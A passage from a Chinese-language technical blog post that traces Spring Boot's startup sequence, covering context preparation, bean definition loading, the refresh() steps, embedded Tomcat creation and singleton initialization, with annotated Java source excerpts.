是一个抽象程度非常高的上下文。实现了大量与应用类型无关的 bean 操作，后面的 bean 初始化会靠它，另外一个很重要的是 这里默认初始花了一个 DefaultListableBeanFactory 作为 bean 工厂。</p><p><img src="/Spring/spring/spring-boot-workflow/image-20200405225010409.png" alt="image-20200405225010409"></p><h3 id="3-8-准备应用上下文"><a href="#3-8-准备应用上下文" class="headerlink" title="3.8 准备应用上下文"></a>3.8 准备应用上下文</h3><pre><code class="java">private void prepareContext(ConfigurableApplicationContext context,      ConfigurableEnvironment environment, SpringApplicationRunListeners listeners,      ApplicationArguments applicationArguments, Banner printedBanner) {   // 设置环境信息   context.setEnvironment(environment);   // 3.8.1 配置 bean 生成器和资源加载器   postProcessApplicationContext(context);   // 3.8.2 应用所有的初始化器    applyInitializers(context);   // 上下文准备完成通知   listeners.contextPrepared(context);   // 3.8.3 记录启动日志   if (this.logStartupInfo) {      logStartupInfo(context.getParent() == null);      logStartupProfileInfo(context);   }   // 3.8.4 注册两个特殊的 bean    ConfigurableListableBeanFactory beanFactory = context.getBeanFactory();   beanFactory.registerSingleton(&quot;springApplicationArguments&quot;, applicationArguments);   if (printedBanner != null) {      beanFactory.registerSingleton(&quot;springBootBanner&quot;, printedBanner);   }   if (beanFactory instanceof DefaultListableBeanFactory) {      ((DefaultListableBeanFactory) beanFactory)            .setAllowBeanDefinitionOverriding(this.allowBeanDefinitionOverriding);   }   // 3.8.5 加载所有的资源    Set&lt;Object&gt; sources = getAllSources();   Assert.notEmpty(sources, &quot;Sources must not be empty&quot;);   load(context, sources.toArray(new Object[0]));   // 通知上下文加载完成   listeners.contextLoaded(context);}</code></pre><h4 id="3-8-1-配置-bean-生成器和资源加载器"><a href="#3-8-1-配置-bean-生成器和资源加载器" class="headerlink" title="3.8.1 配置 bean 生成器和资源加载器"></a>3.8.1 配置 bean 生成器和资源加载器</h4><pre><code class="java">protected void postProcessApplicationContext(ConfigurableApplicationContext context) {   if (this.beanNameGenerator != null) {      context.getBeanFactory().registerSingleton(            AnnotationConfigUtils.CONFIGURATION_BEAN_NAME_GENERATOR,            this.beanNameGenerator);   }   if (this.resourceLoader != null) {      if (context instanceof GenericApplicationContext) {         ((GenericApplicationContext) context)               .setResourceLoader(this.resourceLoader);      }      if (context instanceof DefaultResourceLoader) {         ((DefaultResourceLoader) context)               .setClassLoader(this.resourceLoader.getClassLoader());      }   }   if (this.addConversionService) {      context.getBeanFactory().setConversionService(            ApplicationConversionService.getSharedInstance());   }}</code></pre><h4 id="3-8-2-应用所有的初始化器"><a href="#3-8-2-应用所有的初始化器" class="headerlink" title="3.8.2 应用所有的初始化器"></a>3.8.2 应用所有的初始化器</h4><pre><code class="java">protected void applyInitializers(ConfigurableApplicationContext context) {   for (ApplicationContextInitializer initializer : getInitializers()) {      Class&lt;?&gt; requiredType = GenericTypeResolver.resolveTypeArgument(            initializer.getClass(), ApplicationContextInitializer.class);      Assert.isInstanceOf(requiredType, context, &quot;Unable to call initializer.&quot;);      initializer.initialize(context);   }}</code></pre><p>这一步会把所有符合条件的 ApplicationContextInitializer 应用一遍，实际上 spring boot 的主要启动过程都在这几个 ApplicationContextInitializer 中。</p><p>前面讲过，spring boot 是如何将需要的类加载进来，这里需要说明下几个主要的初始化器的功能。</p><p>我在调试时主要有这几个：</p><pre><code>org.springframework.boot.devtools.restart.RestartScopeInitializerorg.springframework.boot.autoconfigure.SharedMetadataReaderFactoryContextInitializerorg.springframework.boot.autoconfigure.logging.ConditionEvaluationReportLoggingListenerorg.springframework.boot.context.ConfigurationWarningsApplicationContextInitializerorg.springframework.boot.context.ContextIdApplicationContextInitializerorg.springframework.boot.context.config.DelegatingApplicationContextInitializerorg.springframework.boot.web.context.ServerPortInfoApplicationContextInitializer</code></pre><p><strong>RestartScopeInitializer</strong></p><p>主要是注册了一个 restart 的 bean scope 用热重载。</p><pre><code class="java">public void initialize(ConfigurableApplicationContext applicationContext) {   applicationContext.getBeanFactory().registerScope(&quot;restart&quot;, new RestartScope());}</code></pre><p>在 RestartScope 中使用了 Restarter 来刷新应用。</p><p>TODO </p><h4 id="3-8-3-记录启动日志"><a href="#3-8-3-记录启动日志" class="headerlink" title="3.8.3 记录启动日志"></a>3.8.3 记录启动日志</h4><p>创建了一个日志类，将日志打出</p><pre><code class="java">new StartupInfoLogger(this.mainApplicationClass)      .logStarting(getApplicationLog());</code></pre><pre><code class="java">public void logStarting(Log log) {   Assert.notNull(log, &quot;Log must not be null&quot;);   if (log.isInfoEnabled()) {      log.info(getStartupMessage());   }   if (log.isDebugEnabled()) {      log.debug(getRunningMessage());   }}</code></pre><p> 先判断日志是否开启 <code>log.isInfoEnabled</code>() 是为了提高性能，如果开启 info 会打出启动信息。只有开启 debug 级别的日志，才会打出运行时信息。</p><pre><code>logStartupProfileInfo(context);</code></pre><p>接下来打印 profile 的日志信息，如果没有设置 profile，也就是会显示我们平时看到的 </p><blockquote><p>No active profile set, falling back to default profiles: default</p></blockquote><h4 id="3-8-4-注册两个特殊的-bean"><a href="#3-8-4-注册两个特殊的-bean" class="headerlink" title="3.8.4 注册两个特殊的 bean"></a>3.8.4 注册两个特殊的 bean</h4><pre><code class="java">ConfigurableListableBeanFactory beanFactory = context.getBeanFactory();beanFactory.registerSingleton(&quot;springApplicationArguments&quot;, applicationArguments);if (printedBanner != null) {   beanFactory.registerSingleton(&quot;springBootBanner&quot;, printedBanner);}if (beanFactory instanceof DefaultListableBeanFactory) {   ((DefaultListableBeanFactory) beanFactory)         .setAllowBeanDefinitionOverriding(this.allowBeanDefinitionOverriding);}</code></pre><p>这里将当前使用到的  <code>applicationArguments</code> 和 <code>springBootBanner</code>  注册成单例，用于后面需要的时候获取。通过这种方式附加到上下文中。</p><h4 id="3-8-5-加载所有的资源-包扫描-补充点"><a href="#3-8-5-加载所有的资源-包扫描-补充点" class="headerlink" title="3.8.5 加载所有的资源 (包扫描) [补充点]"></a>3.8.5 加载所有的资源 (包扫描) [补充点]</h4><pre><code class="java">        // 3.8.5.1 加载包扫描资源类    Set&lt;Object&gt; sources = getAllSources();        Assert.notEmpty(sources, &quot;Sources must not be empty&quot;);    // 3.8.5.2 包扫描        load(context, sources.toArray(new Object[0]));        listeners.contextLoaded(context);</code></pre><h5 id="3-8-5-1-加载包扫描资源类"><a href="#3-8-5-1-加载包扫描资源类" class="headerlink" title="3.8.5.1 加载包扫描资源类"></a>3.8.5.1 加载包扫描资源类</h5><pre><code class="java">public Set&lt;Object&gt; getAllSources() {   Set&lt;Object&gt; allSources = new LinkedHashSet&lt;&gt;();   if (!CollectionUtils.isEmpty(this.primarySources)) {      allSources.addAll(this.primarySources);   }   if (!CollectionUtils.isEmpty(this.sources)) {      allSources.addAll(this.sources);   }   return Collections.unmodifiableSet(allSources);}</code></pre><p>˙这里的 primarySources 就是指的 run 方法传入的类，spring boot 会根据资源类所在的包进行扫描。加载各种业务对象。因此可以在入口类中，可以做一些拓展，主动加载其他资源，甚至远程资源。</p><h5 id="3-8-5-2-包扫描"><a href="#3-8-5-2-包扫描" class="headerlink" title="3.8.5.2 包扫描"></a>3.8.5.2 包扫描</h5><pre><code class="java">protected void load(ApplicationContext context, Object[] sources) {   if (logger.isDebugEnabled()) {      logger.debug(            &quot;Loading source &quot; + StringUtils.arrayToCommaDelimitedString(sources));   }   // 初始化 bean 加载器   BeanDefinitionLoader loader = createBeanDefinitionLoader(         getBeanDefinitionRegistry(context), sources);   if (this.beanNameGenerator != null) {      loader.setBeanNameGenerator(this.beanNameGenerator);   }   if (this.resourceLoader != null) {      loader.setResourceLoader(this.resourceLoader);   }   if (this.environment != null) {      loader.setEnvironment(this.environment);   }   // 最终的初始化类的地方   loader.load();}// 下面调用了 BeanDefinitionLoader 的构造方法protected BeanDefinitionLoader createBeanDefinitionLoader(      BeanDefinitionRegistry registry, Object[] sources) {   return new BeanDefinitionLoader(registry, sources);}</code></pre><pre><code class="java"> // BeanDefinitionLoader 实际上是一个简单的外观模式，包装了 Spring 中初始化 bean 的常用方法 BeanDefinitionLoader(BeanDefinitionRegistry registry, Object... sources) {        Assert.notNull(registry, &quot;Registry must not be null&quot;);        Assert.notEmpty(sources, &quot;Sources must not be empty&quot;);        this.sources = sources;    // 基于注解的 bean 阅读器        this.annotatedReader = new AnnotatedBeanDefinitionReader(registry);        this.xmlReader = new XmlBeanDefinitionReader(registry);        if (isGroovyPresent()) {            this.groovyReader = new GroovyBeanDefinitionReader(registry);        }    // 类扫描器        this.scanner = new ClassPathBeanDefinitionScanner(registry);        this.scanner.addExcludeFilter(new ClassExcludeFilter(sources));    }</code></pre><p>这里就是 spring boot 利用 spring 初始化各种类的核心了。通过 BeanDefinitionLoader 包装 spring 中的 bean 实例化工具，初始化各种对象。</p><p>当所有的准备工作做完后，通过调用 loader.load(); 初始化各种 bean 。</p><pre><code class="java">// 多资源加载public int load() {   int count = 0;   for (Object source : this.sources) {      count += load(source);   }   return count;}// 某个资源，一般这个资源是根目录下的一个类，例如 Application.class 但是 Spring 也是支持各种加载方式。private int load(Object source) {   Assert.notNull(source, &quot;Source must not be null&quot;);   // 一般都会走这里   if (source instanceof Class&lt;?&gt;) {      return load((Class&lt;?&gt;) source);   }   if (source instanceof Resource) {      return load((Resource) source);   }   if (source instanceof Package) {      return load((Package) source);   }   if (source instanceof CharSequence) {      return load((CharSequence) source);   }   throw new IllegalArgumentException(&quot;Invalid source type &quot; + source.getClass());}private int load(Class&lt;?&gt; source) {        if (isGroovyPresent()                &amp;&amp; GroovyBeanDefinitionSource.class.isAssignableFrom(source)) {            // Any GroovyLoaders added in beans{} DSL can contribute beans here            GroovyBeanDefinitionSource loader = BeanUtils.instantiateClass(source,                    GroovyBeanDefinitionSource.class);            load(loader);        }        if (isComponent(source)) {            this.annotatedReader.register(source);            return 1;        }        return 0;}</code></pre><p>isComponent 是用来排除匿名类等特殊情况，一般来说都会为 true，然后进入 </p><pre><code class="java">this.annotatedReader.register(source);</code></pre><p>到了这里就已经是 Spring 的地盘了，spring boot 的工作完成了，交给 spring 去初始化各种对象了。</p><h3 id="3-9-刷新-初始化-应用上下文-spring-核心"><a href="#3-9-刷新-初始化-应用上下文-spring-核心" class="headerlink" title="3.9 刷新(初始化)应用上下文 [spring 核心]"></a>3.9 刷新(初始化)应用上下文 [spring 核心]</h3><pre><code class="java">protected void refresh(ApplicationContext applicationContext) {   Assert.isInstanceOf(AbstractApplicationContext.class, applicationContext);   ((AbstractApplicationContext) applicationContext).refresh();}</code></pre><p>spring boot 把 context 作为 applicationContext 传入，然后转换成 AbstractApplicationContext 调用 spring 的refresh() 开启 bean 初始化的流程。</p><p>spring 的 refresh 实际上就是初始化 bean，为什么是 refresh()，而不是 init()，这个名字非常奇怪。实际上，spring 的 refresh 不仅仅对新的 context 有用，对旧的 context 会销毁重建，因此 refresh 这个词更适中。</p><pre><code class="java">@Overridepublic void refresh() throws BeansException, IllegalStateException {   // 加锁，防止多次启动或者销毁操作造成混乱   synchronized (this.startupShutdownMonitor) {      // 3.9.1 准备刷新，记录启动时间、状态      prepareRefresh();      // 3.9.2 提取 bean 的配置      ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();      // 3.9.3 准备 Bean 容器      prepareBeanFactory(beanFactory);      try {         // 3.9.4 后置处理 bean 工厂         postProcessBeanFactory(beanFactory);         // 3.9.5 调用工厂后置处理器         invokeBeanFactoryPostProcessors(beanFactory);         // 3.9.6 注册 bean 后置处理器         registerBeanPostProcessors(beanFactory);         // 3.9.7 初始化国际化消息         initMessageSource();         // 3.9.8 初始化事件广播器         initApplicationEventMulticaster();         // 3.9.9 onRefresh 钩子         onRefresh();         // 注册监听器         registerListeners();         // 3.9.10 初始化所有的 singleton beans         finishBeanFactoryInitialization(beanFactory);         // 广播事件，启动 web 服务器         finishRefresh();      }      catch (BeansException ex) {         if (logger.isWarnEnabled()) {            logger.warn(&quot;Exception encountered during context initialization - &quot; +                  &quot;cancelling refresh attempt: &quot; + ex);         }         // 3.9.11 销毁已经初始化的 singleton 的 Beans          destroyBeans();         // 设置初始话状态         cancelRefresh(ex);         // 往外丢异常         throw ex;      }      finally {         // 3.9.12 清理构建过程中的对象缓存         resetCommonCaches();      }   }}</code></pre><p>这部分就是 spring 容器初始化的核心逻辑了，spring 更多细节可以查看其他材料。</p><p>推荐材料：<a href="https://www.javadoop.com/post/spring-ioc" target="_blank" rel="noopener">https://www.javadoop.com/post/spring-ioc</a></p><h5 id="3-9-1-准备刷新，记录启动时间、状态"><a href="#3-9-1-准备刷新，记录启动时间、状态" class="headerlink" title="3.9.1 准备刷新，记录启动时间、状态"></a>3.9.1 准备刷新，记录启动时间、状态</h5><pre><code class="java">protected void prepareRefresh() {   // 设置状态和时间   this.startupDate = System.currentTimeMillis();   this.closed.set(false);   this.active.set(true);   if (logger.isDebugEnabled()) {      if (logger.isTraceEnabled()) {         logger.trace(&quot;Refreshing &quot; + this);      }      else {         logger.debug(&quot;Refreshing &quot; + getDisplayName());      }   }   // 空方法，留给子类初始化配置   initPropertySources();   // 验证必要的属性   getEnvironment().validateRequiredProperties();   // 将 applicationListeners 用 earlyApplicationListeners 包裹起来   if (this.earlyApplicationListeners == null) {      this.earlyApplicationListeners = new LinkedHashSet&lt;&gt;(this.applicationListeners);   }   else {      this.applicationListeners.clear();      this.applicationListeners.addAll(this.earlyApplicationListeners);   }   this.earlyApplicationEvents = new LinkedHashSet&lt;&gt;();</code></pre><h5 id="3-9-2-提取-bean-的配置"><a href="#3-9-2-提取-bean-的配置" class="headerlink" title="3.9.2 提取 bean 的配置"></a>3.9.2 提取 bean 的配置</h5><pre><code class="java">protected ConfigurableListableBeanFactory obtainFreshBeanFactory() {   // 关闭旧的 BeanFactory 重新加载 bean 信息。   refreshBeanFactory();   // 返回刚刚创建的 BeanFactory   ConfigurableListableBeanFactory beanFactory = getBeanFactory();   if (logger.isDebugEnabled()) {      logger.debug(&quot;Bean factory for &quot; + getDisplayName() + &quot;: &quot; + beanFactory);   }   return beanFactory;}</code></pre><p>需要特别注意这句代码，refreshBeanFactory 是 ConfigurableApplicationContext 的接口，最终实现主要是两个类： GenericApplicationContext、AbstractRefreshableApplicationContext。</p><p>我们使用 Spring boot 走注解方式配置，使用的是 GenericApplicationContext ，而 xml 相关使用的是 AbstractRefreshableApplicationContext。他们在 refreshBeanFactory 方法实现上差异较大。</p><p>需要注意，我们现在通过 spring boot 分析，走的是注解这边。</p><p><img src="/Spring/spring/spring-boot-workflow/image-20200406094251066.png" alt="image-20200406094251066"></p><h5 id="3-9-3-准备-Bean-容器"><a href="#3-9-3-准备-Bean-容器" class="headerlink" title="3.9.3 准备 Bean 容器"></a>3.9.3 准备 Bean 容器</h5><p>这里为 bean 工厂准备一些必要的组件，例如加载后置处理器、类加载器、依赖处理器（spring 支持双向依赖）等。 这里的 bean 工厂一般是 DefaultListableBeanFactory，DefaultListableBeanFactory 是在前面创建应用上下文就创建好了的。基本上在 Spring 中最牛的就是 DefaultListableBeanFactory 了。</p><pre><code class="java">protected void prepareBeanFactory(ConfigurableListableBeanFactory beanFactory) {        // Tell the internal bean factory to use the context&#39;s class loader etc.    // 设置 BeanFactory 的类加载器        beanFactory.setBeanClassLoader(getClassLoader());    // 设置 EL 表达式处理器        beanFactory.setBeanExpressionResolver(new StandardBeanExpressionResolver(beanFactory.getBeanClassLoader()));    // 设置属性编辑器        beanFactory.addPropertyEditorRegistrar(new ResourceEditorRegistrar(this, getEnvironment()));        // 设置后置处理器, ApplicationContextAwareProcessor 可以自定定义，也可以使用注解，又属于 spring 拓展点之一。我们可以通过 ApplicationContextAware 获取 ApplicationContext。        beanFactory.addBeanPostProcessor(new ApplicationContextAwareProcessor(th    is));    // 自动装配的时候忽略,这几个类比较特殊        beanFactory.ignoreDependencyInterface(EnvironmentAware.class);        beanFactory.ignoreDependencyInterface(EmbeddedValueResolverAware.class);        beanFactory.ignoreDependencyInterface(ResourceLoaderAware.class);        beanFactory.ignoreDependencyInterface(ApplicationEventPublisherAware.class);        beanFactory.ignoreDependencyInterface(MessageSourceAware.class);        beanFactory.ignoreDependencyInterface(ApplicationContextAware.class);        // 特殊的依赖注入，因为这几个 bean 是作为 spring 关键组件，就是容器本身。用 registerResolvableDependency 这种方式注入。MessageSource 作为普通的 bean 被注入到容器中。        // MessageSource registered (and found for autowiring) as a bean.        beanFactory.registerResolvableDependency(BeanFactory.class, beanFactory);        beanFactory.registerResolvableDependency(ResourceLoader.class, this);        beanFactory.registerResolvableDependency(ApplicationEventPublisher.class, this);        beanFactory.registerResolvableDependency(ApplicationContext.class, this);        // 在 bean 实例化后，如果是 ApplicationListener 的子类，会被注册到监听器中。细节有 ApplicationListenerDetector 处理。        beanFactory.addBeanPostProcessor(new ApplicationListenerDetector(this));        // 如果存在 AOP 的bean，在运行期织入。任务由 LoadTimeWeaverAwareProcessor 完成。        if (beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) {            beanFactory.addBeanPostProcessor(new LoadTimeWeaverAwareProcessor(beanFactory));            // Set a temporary ClassLoader for type matching.            beanFactory.setTempClassLoader(new ContextTypeMatchClassLoader(beanFactory.getBeanClassLoader()));        }        // 注册默认的环境相关的 bean，的 bean 被直接注入到容器中。    // environment         if (!beanFactory.containsLocalBean(ENVIRONMENT_BEAN_NAME)) {            beanFactory.registerSingleton(ENVIRONMENT_BEAN_NAME, getEnvironment());        }    // systemProperties        if (!beanFactory.containsLocalBean(SYSTEM_PROPERTIES_BEAN_NAME)) {            beanFactory.registerSingleton(SYSTEM_PROPERTIES_BEAN_NAME, getEnvironment().getSystemProperties());        }    // systemEnvironment        if (!beanFactory.containsLocalBean(SYSTEM_ENVIRONMENT_BEAN_NAME)) {            beanFactory.registerSingleton(SYSTEM_ENVIRONMENT_BEAN_NAME, getEnvironment().getSystemEnvironment());        }    }</code></pre><h5 id="3-9-4-后置处理-bean-工厂"><a href="#3-9-4-后置处理-bean-工厂" class="headerlink" title="3.9.4 后置处理 bean 工厂"></a>3.9.4 后置处理 bean 工厂</h5><p>对我们的 bean 工厂后置处理，也就是 AnnotationConfigServletWebServerApplicationContext 中的 postProcessBeanFactory 方法。这个是前面检测应用类型决定的。</p><pre><code class="java">@Overrideprotected void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {   super.postProcessBeanFactory(beanFactory);   if (this.basePackages != null &amp;&amp; this.basePackages.length &gt; 0) {      this.scanner.scan(this.basePackages);   }   if (!this.annotatedClasses.isEmpty()) {      this.reader.register(ClassUtils.toClassArray(this.annotatedClasses));   }}</code></pre><p>如果没有包扫描，会再去进行包扫描。从批判的眼光来看，spring 有很多重复代码，前面实际上完成了 包扫描的任务的。</p><h5 id="3-9-5-调用工厂后置处理器-补充点"><a href="#3-9-5-调用工厂后置处理器-补充点" class="headerlink" title="3.9.5 调用工厂后置处理器 [补充点]"></a>3.9.5 调用工厂后置处理器 [补充点]</h5><p>这里是真正的调用后置处理器，也就是业务中自定义的处理器，在这里完成。注意，这里实在最终 bean 实例化完成之前调用的，另外需要注意后置处理器会按照顺序调用 。</p><pre><code class="java">protected void invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory) {   PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(beanFactory, getBeanFactoryPostProcessors());   // Detect a LoadTimeWeaver and prepare for weaving, if found in the meantime   // (e.g. through an @Bean method registered by ConfigurationClassPostProcessor)   if (beanFactory.getTempClassLoader() == null &amp;&amp; beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) {      beanFactory.addBeanPostProcessor(new LoadTimeWeaverAwareProcessor(beanFactory));      beanFactory.setTempClassLoader(new ContextTypeMatchClassLoader(beanFactory.getBeanClassLoader()));   }}</code></pre><p>最为关键的方法是 PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors ，基本原理就是拿到所有的后置处理器，然后在这里循环执行。</p><p>为了不打乱主线思路，这里在 Spring IOC 的地方拆开讨论。</p><h5 id="3-9-6-注册-Bean-后置处理器"><a href="#3-9-6-注册-Bean-后置处理器" class="headerlink" title="3.9.6 注册 Bean 后置处理器"></a>3.9.6 注册 Bean 后置处理器</h5><p>这里有一连串的后置处理，实际上都不一样：</p><pre><code class="java">            // 后置处理 bean 工厂，这里是子类钩子方法            postProcessBeanFactory(beanFactory);            // 调用 bean 工厂后置处理器,这里是一个工厂处理器的责任链循环调用            invokeBeanFactoryPostProcessors(beanFactory);            // 调用 bean 自身的后置处理器,这里是一个 bean 后置处理器的责任链循环调用            registerBeanPostProcessors(beanFactory);</code></pre><pre><code class="java">protected void registerBeanPostProcessors(ConfigurableListableBeanFactory beanFactory) {   PostProcessorRegistrationDelegate.registerBeanPostProcessors(beanFactory, this);}</code></pre><p>这里又到了复杂的 IOC 逻辑，这里只是注册，后面才会调用。registerBeanPostProcessors 的主要职责就是</p><ol><li>获取 bean name </li><li>排序</li><li>添加到一个数组中</li></ol><h5 id="3-9-7-初始化国际化消息"><a href="#3-9-7-初始化国际化消息" class="headerlink" title="3.9.7 初始化国际化消息"></a>3.9.7 初始化国际化消息</h5><p>​    </p><pre><code class="java">protected void initMessageSource() {   ConfigurableListableBeanFactory beanFactory = getBeanFactory();   if (beanFactory.containsLocalBean(MESSAGE_SOURCE_BEAN_NAME)) {      this.messageSource = beanFactory.getBean(MESSAGE_SOURCE_BEAN_NAME, MessageSource.class);      // Make MessageSource aware of parent MessageSource.      if (this.parent != null &amp;&amp; this.messageSource instanceof HierarchicalMessageSource) {         HierarchicalMessageSource hms = (HierarchicalMessageSource) this.messageSource;         if (hms.getParentMessageSource() == null) {            // Only set parent context as parent MessageSource if no parent MessageSource            // registered already.            hms.setParentMessageSource(getInternalParentMessageSource());         }      }      if (logger.isTraceEnabled()) {         logger.trace(&quot;Using MessageSource [&quot; + this.messageSource + &quot;]&quot;);      }   }   else {      // Use empty MessageSource to be able to accept getMessage calls.      DelegatingMessageSource dms = new DelegatingMessageSource();      dms.setParentMessageSource(getInternalParentMessageSource());      this.messageSource = dms;      beanFactory.registerSingleton(MESSAGE_SOURCE_BEAN_NAME, this.messageSource);      if (logger.isTraceEnabled()) {         logger.trace(&quot;No &#39;&quot; + MESSAGE_SOURCE_BEAN_NAME + &quot;&#39; bean, using [&quot; + this.messageSource + &quot;]&quot;);      }   }}</code></pre><p>这部分逻辑比较简单，如果有注册 messageSource 就设置 messageSource ，没有就设置一个空的，防止方法调用失败，以及打出日志。</p><h5 id="3-9-8-onRefresh-钩子-启动-web-服务-补充点"><a href="#3-9-8-onRefresh-钩子-启动-web-服务-补充点" class="headerlink" title="3.9.8 onRefresh 钩子,启动 web 服务 [补充点]"></a>3.9.8 onRefresh 钩子,启动 web 服务 [补充点]</h5><p>这个方法对于非 web 项目无所谓，但是对于 web 项目非常重要，因为在 ServletWebServerApplicationContext 中，会在这个时候启动 web 服务器，默认是内置的 Tomecat。</p><pre><code class="java">@Overrideprotected void onRefresh() {   // 父类会初始话一个 themeSource    super.onRefresh();   try {      createWebServer();   }   catch (Throwable ex) {      throw new ApplicationContextException(&quot;Unable to start web server&quot;, ex);   }}</code></pre><pre><code class="java">private void createWebServer() {   WebServer webServer = this.webServer;   // 获取 servlet 上下文   ServletContext servletContext = getServletContext();   if (webServer == null &amp;&amp; servletContext == null) {      // 根据注册的 bean 获取 web server 工厂，实际上这里偷偷提前初始化了一个 bean 就是factory。因为 getWebServerFactory 是通过 beanFactory.getBean 和 名字获取的。beanFactory.getBean 实际上就是在初始化 bean。      ServletWebServerFactory factory = getWebServerFactory();      this.webServer = factory.getWebServer(getSelfInitializer());   }   else if (servletContext != null) {      try {         // 启动 web server，只是针对 servletContext 存在的情况，新建的 context不需要监听         getSelfInitializer().onStartup(servletContext);      }      catch (ServletException ex) {         throw new ApplicationContextException(&quot;Cannot initialize servlet context&quot;, ex);      }   }   // 初始化 servletContext 中的配置信息    initPropertySources();}</code></pre><p>这里面涉及内置 web 服务器如果被创建出来，非常有趣，但是范围太大了，在后面展开。基本的逻辑就是根据工厂调用 Tomcat 的入口方法然后写入一些配置。</p><pre><code class="java">public WebServer getWebServer(ServletContextInitializer... initializers) {   if (this.disableMBeanRegistry) {      Registry.disableRegistry();   }   // 构造 Tomecat 实例   Tomcat tomcat = new Tomcat();   File baseDir = (this.baseDirectory != null) ? this.baseDirectory : createTempDir(&quot;tomcat&quot;);   tomcat.setBaseDir(baseDir.getAbsolutePath());   Connector connector = new Connector(this.protocol);   connector.setThrowOnFailure(true);   tomcat.getService().addConnector(connector);   customizeConnector(connector);   tomcat.setConnector(connector);   tomcat.getHost().setAutoDeploy(false);   configureEngine(tomcat.getEngine());   for (Connector additionalConnector : this.additionalTomcatConnectors) {      tomcat.getService().addConnector(additionalConnector);   }   prepareContext(tomcat.getHost(), initializers);   return getTomcatWebServer(tomcat);}</code></pre><p>到目前为止，web 服务已经启动成功了从日志中能看到端口、服务器等信息。</p><p>留一个问题，Tomcat 是怎么知道 Spring mvc 的 Servlet 入口点的呢？</p><h5 id="3-9-9-初始化事件广播器-补充点"><a href="#3-9-9-初始化事件广播器-补充点" class="headerlink" title="3.9.9 初始化事件广播器 [补充点]"></a>3.9.9 初始化事件广播器 [补充点]</h5><pre><code class="java">protected void registerListeners() {   // 获取事件通道并添加监听器，这里只是注册静态监听器，不需要 bean 初始化   for (ApplicationListener&lt;?&gt; listener : getApplicationListeners()) {      getApplicationEventMulticaster().addApplicationListener(listener);   }   // 将对象监听器添加到列表中，但是不初始化，留给后面的 post-processors 处理   String[] listenerBeanNames = getBeanNamesForType(ApplicationListener.class, true, false);   for (String listenerBeanName : listenerBeanNames) {      getApplicationEventMulticaster().addApplicationListenerBean(listenerBeanName);   }   // 现在有事件通道了，将早期的应用事件发送出去   Set&lt;ApplicationEvent&gt; earlyEventsToProcess = this.earlyApplicationEvents;   this.earlyApplicationEvents = null;   if (earlyEventsToProcess != null) {      for (ApplicationEvent earlyEvent : earlyEventsToProcess) {         getApplicationEventMulticaster().multicastEvent(earlyEvent);      }   }}</code></pre><p>这个方法的主要作用是讲上下文中的监听器，添加到 applicationEventMulticaster 上，applicationEventMulticaster 是一个消息通道，用于实现监听者模式的关键角色。</p><h5 id="3-9-10-初始化所有的-singleton-beans-核心点"><a href="#3-9-10-初始化所有的-singleton-beans-核心点" class="headerlink" title="3.9.10 初始化所有的 singleton beans [核心点]"></a>3.9.10 初始化所有的 singleton beans [核心点]</h5><p>这一步就是初始化所有的单例 bean 了，懒加载的 bean 和其他 scope 的初始化过程并不在这里。</p><p>到目前为止：</p><ul><li>bean 信息已经注册完成</li><li>postProcessBeanFactory 已经完成</li><li>environment、systemProperties 已经被手动初始话</li><li>服务器已经启动 ，同时初始化了一个 servletFactory 的bean</li><li>主题已经加载</li><li>国际化已经初始话</li><li>事件通道已经就绪</li></ul><p>接下来就是完成最终的 bean 初始化。</p><pre><code class="java">protected void finishBeanFactoryInitialization(ConfigurableListableBeanFactory beanFactory) {   // beanFactory.getBean 就是在初始化，这里优先初始化 ConversionService 前面提到了，这个是用来做类型转换的。   if (beanFactory.containsBean(CONVERSION_SERVICE_BEAN_NAME) &amp;&amp;         beanFactory.isTypeMatch(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class)) {      beanFactory.setConversionService(            beanFactory.getBean(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class));   }   // 如果没有 EmbeddedValueResolver 就配置一个默认的 EmbeddedValueResolver，这个 resolver 的目的是处理 ${}这样的属性，通过内置的 EL 上下文处理完成。   if (!beanFactory.hasEmbeddedValueResolver()) {      beanFactory.addEmbeddedValueResolver(strVal -&gt; getEnvironment().resolvePlaceholders(strVal));   }   // 初始化切面相关的 bean，LoadTimeWeaverAware  类型   String[] weaverAwareNames = beanFactory.getBeanNamesForType(LoadTimeWeaverAware.class, false, false);   for (String weaverAwareName : weaverAwareNames) {      getBean(weaverAwareName);   }   // 停用 TempClassLoader，这个时候类已经全部加载完成了   beanFactory.setTempClassLoader(null);   // 冻结掉所有的读取配置行为，不希望在这个过程中发生变化   beanFactory.freezeConfiguration();   // 初始化所有的剩下的非懒加载的 bean，根据 bean 定义数组中的类名，循环调用 getBean 初始化   beanFactory.preInstantiateSingletons();}</code></pre><p><strong>TempClassLoader 说明</strong></p><p>TempClassLoader 的用处是 匹配类型，默认是空，简单的使用标准的类加载器。临时类加载器只是检查是不是一个运行时切面被应用了，然后尽可能的延迟初始化。临时类加载器在启动过程完成后，会被移除。</p><pre><code class="java">/** * Specify a temporary ClassLoader to use for type matching purposes. * Default is none, simply using the standard bean ClassLoader. * &lt;p&gt;A temporary ClassLoader is usually just specified if * &lt;i&gt;load-time weaving&lt;/i&gt; is involved, to make sure that actual bean * classes are loaded as lazily as possible. The temporary loader is * then removed once the BeanFactory completes its bootstrap phase. * @since 2.5 */</code></pre><p>然后就是 spring 中最难的 preInstantiateSingletons  方法了。</p><pre><code class="java">//代码位于 DefaultListableBeanFactory.java @Overridepublic void preInstantiateSingletons() throws BeansException {   if (logger.isTraceEnabled()) {      logger.trace(&quot;Pre-instantiating singletons in &quot; + this);   }   // 遍历一遍 beanDefinitionNames，在这个过程中还会向 beanDefinitionNames 中添加新的内容   List&lt;String&gt; beanNames = new ArrayList&lt;&gt;(this.beanDefinitionNames);   // 触发非懒加载的 bean 创建   for (String beanName : beanNames) {      // 合并父 Bean 中的配置，父 bean 的配置并不像 java 的继承那样，而是给一个公共的配置参数而已，这一步相当于将公共的配置参数内联到当前的 bean 定义上。      RootBeanDefinition bd = getMergedLocalBeanDefinition(beanName);      // 只有非抽象类、单例、非懒加载才需要在这个时候初始化      if (!bd.isAbstract() &amp;&amp; bd.isSingleton() &amp;&amp; !bd.isLazyInit()) {         // factoryBean 